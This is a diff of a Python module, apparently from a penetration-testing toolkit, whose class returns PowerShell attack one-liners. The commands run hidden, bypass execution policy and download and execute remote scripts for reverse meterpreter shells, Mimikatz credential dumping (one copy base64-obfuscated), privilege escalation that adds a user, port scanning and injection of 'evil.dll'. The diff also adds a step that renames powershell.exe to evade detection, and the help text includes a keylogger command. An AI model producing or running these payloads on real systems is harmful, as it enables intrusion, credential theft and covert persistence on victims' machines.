@@ -1,6 +1,5 @@
 # encoding: utf8
-from .config import *
-
+from config import *
 
 class Shell:
     def __init__(self):
@@ -17,7 +16,7 @@ https://github.com/samratashok/nishang
 """
 
         self.desc_reverse = u"""
-metasploit和cobalt通用
+[+] metasploit和cobalt通用
 
 msf5 exploit(multi/script/web_delivery) > show options
 
@@ -40,13 +39,6 @@ Payload options (windows/meterpreter/reverse_http):
    LPORT     8888             yes       The local listener port
    LURI                       no        The HTTP Path
 
-Exploit target:
-
-   Id  Name
-   --  ----
-   2   PSH
-
-
 msf5 exploit(multi/script/web_delivery) > run
 powershell.exe -nop -w hidden -c $x=new-object net.webclient;$x.proxy=[Net.WebRequest]::GetSystemWebProxy();$x.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $x.downloadstring('http://127.0.0.1:8080/69NGTqwFydS2');
 """
@@ -61,13 +53,13 @@ LHOST     192.168.30.129   yes       The local listener hostname
 LPORT     89               yes       The local listener port
 
 Help:
-PS > IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1')
+PS > IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1')
 
 PS > Get-Help Invoke-Shellcode -examples
 """
 
         self.desc_portscan = u"""
-当渗透进内网机器时进行端口扫描，不用下载nmap
+当渗透进内网机器时利用powershell进行端口扫描
 
 PS > IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/j3ers3/PowerSploit/master/Recon/Invoke-Portscan.ps1')
 
@@ -91,31 +83,37 @@ SQL> xp_cmdshell "Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Obje
 ~ $ Get-Keystrokes -LogPath c:\\key.log
 """
 
+        self.desc_invoke_dllinjection = u"""
+调用invoke-dllinjection，将DLL文件直接注入到某进程中
+"""
+
     def test(self):
         print("", self.info['Name'])
         print(self.info['Author'])
 
     def reverse(self):
-        return "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('{url}'))"
+        return "copy C:\Windows\System32\WindowsPowerShell\\v1.0\powershell.exe c:\p.txt\nc:\p.txt -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('{url}'))"
 
-    def invoke_shellcode(self):
-        return "Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/j3ers3/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost {ip} -Lport {port} -Force".format(
-            ip=lhost, port=port_msf)
+    def invoke_shellcode(self, ip=LHOST, port=LPORT):
+        return "Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('{}/CodeExecution/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost {} -Lport {} -Force".format(ps_url, ip, port)
 
     def downloader(self):
         return "powershell (new-object System.Net.WebClient).DownloadFile('{url}','C:\\{file}')"
 
     def mimikatz(self):
-        return "Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/j3ers3/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"
+        return "Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('{}/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz".format(ps_url)
 
     def mimikatz_base64(self):
         return "Powershell.exe -NoP -NonI -Exec Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBoAGUAZQB0AHoALwBQAG8AdwBlAHIAUwBwAGwAbwBpAHQALwBtAGEAcwB0AGUAcgAvAEUAeABmAGkAbAB0AHIAYQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAnACkAOwAgAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6AA=="
 
     def powerup_check(self):
-        return "Powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"
+        return "Powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('{}/Privesc/PowerUp.ps1'); Invoke-AllChecks".format(ps_url)
 
     def powerup_add_user(self):
-        return "Powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1');Write-ServiceExe -ServiceName xxx -Username test1 -Password 123!@#qwe -Verbose"
+        return "Powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('{}/Privesc/PowerUp.ps1');Write-ServiceExe -ServiceName xxx -Username test1 -Password 123!@#qwe -Verbose".format(ps_url)
 
     def portscan(self):
-        return "Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/j3ers3/PowerSploit/master/Recon/Invoke-Portscan.ps1'); Invoke-Portscan -Hosts {ip}/24 -TopPorts 100"
+        return "Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('{ps_url}/Recon/Invoke-Portscan.ps1'); Invoke-Portscan -Hosts {ip}/24 -TopPorts 100"
+
+    def invoke_dllinjection(self):
+        return "Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('{}/CodeExecution/Invoke-DllInjection.ps1');Invoke-DllInjection -Dll evil.dll -ProcessID 1111".format(ps_url)
